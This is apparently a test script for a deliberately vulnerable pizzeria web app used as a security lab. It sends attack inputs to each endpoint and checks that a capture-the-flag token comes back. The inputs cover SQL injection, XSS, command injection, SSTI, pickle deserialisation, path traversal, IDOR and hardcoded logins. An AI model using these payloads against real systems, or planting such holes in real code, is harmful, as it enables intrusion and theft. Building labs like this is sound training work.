from rubber_duck_pizzeria import create_app
from rubber_duck_pizzeria import db as dbmod

dbmod.init_db(force=True)
app = create_app()
c = app.test_client()

checks = []

r = c.get("/api/health")
checks.append(("health", r.status_code, "kitchen_target" in r.get_data(as_text=True)))

r = c.get("/api/search", query_string={"q": "James"})
checks.append(("search_ok", r.status_code, "James" in r.get_data(as_text=True)))

r = c.get("/api/search", query_string={"q": "' OR 1=1--"})
checks.append(("sqli", r.status_code, "FLAG{RD_SQLI_SEARCH}" in r.get_data(as_text=True)))

r = c.get("/api/search", query_string={"format": "html", "q": "<img src=x onerror=alert(1)>"})
checks.append(("xss", r.status_code, "FLAG{RD_XSS_SEARCH}" in r.get_data(as_text=True)))

r = c.get("/api/orders/1")
checks.append(("idor", r.status_code, "FLAG{RD_IDOR_ORDER}" in r.get_data(as_text=True)))

r = c.get("/api/admin/stats", headers={"X-Role": "manager"})
checks.append(("bac", r.status_code, "FLAG{RD_BAC_HEADER}" in r.get_data(as_text=True)))

r = c.post("/api/discount/preview", json={"order_ids": [1, 2, 3]})
checks.append(("logic", r.status_code, "FLAG{RD_LOGIC_DISCOUNT}" in r.get_data(as_text=True)))

r = c.get("/api/customers")
checks.append(("pii", r.status_code, "FLAG{RD_PII_LEAK}" in r.get_data(as_text=True)))

r = c.get("/api/debug/info")
checks.append(("debug", r.status_code, "FLAG{RD_DEBUG_EXPOSE}" in r.get_data(as_text=True)))

r = c.get("/api/path", query_string={"file": "flag_path.txt"})
checks.append(("path", r.status_code, "FLAG{RD_PATH_TRAVERSAL}" in r.get_data(as_text=True)))

r = c.post("/api/login", json={"username": "debug", "password": "rd-debug-2026"})
checks.append(("bypass", r.status_code, "FLAG{RD_HARDCODED_BYPASS}" in r.get_data(as_text=True)))

r = c.post("/api/login", json={"username": "admin", "password": "admin123"})
checks.append(("weak_hash", r.status_code, "FLAG{RD_WEAK_HASH}" in r.get_data(as_text=True)))

r = c.patch("/api/customers/1", json={"is_admin": 1, "notes": "pwn"})
checks.append(("mass", r.status_code, "FLAG{RD_MASS_ASSIGN}" in r.get_data(as_text=True)))

r = c.get("/api/report", query_string={"name": "daily; echo FLAG"})
checks.append(("cmdi", r.status_code, "FLAG{RD_CMDI_REPORT}" in r.get_data(as_text=True)))

r = c.post("/api/config/eval", json={"snippet": "x=1"})
checks.append(("exec", r.status_code, "FLAG{RD_EXEC_CONFIG}" in r.get_data(as_text=True)))

r = c.get("/api/render", query_string={"template": "{{ config }}", "name": "x"})
checks.append(("ssti", r.status_code, "FLAG{RD_SSTI_RENDER}" in r.get_data(as_text=True)))

import pickle
r = c.post("/api/promo/import", data=pickle.dumps({"off": 10}), content_type="application/octet-stream")
checks.append(("pickle", r.status_code, "FLAG{RD_PICKLE_PROMO}" in r.get_data(as_text=True)))

r = c.post("/api/reviews", json={"customer_name": "Test", "body": "<script>alert(1)</script>", "rating": 5})
checks.append(("stored", r.status_code, "FLAG{RD_XSS_STORED}" in r.get_data(as_text=True)))

failed = 0
for name, code, ok in checks:
    status = "OK" if ok and code < 500 else "FAIL"
    if status == "FAIL":
        failed += 1
    print(f"{status:4} {code} {name}")

print("failed", failed, "of", len(checks))
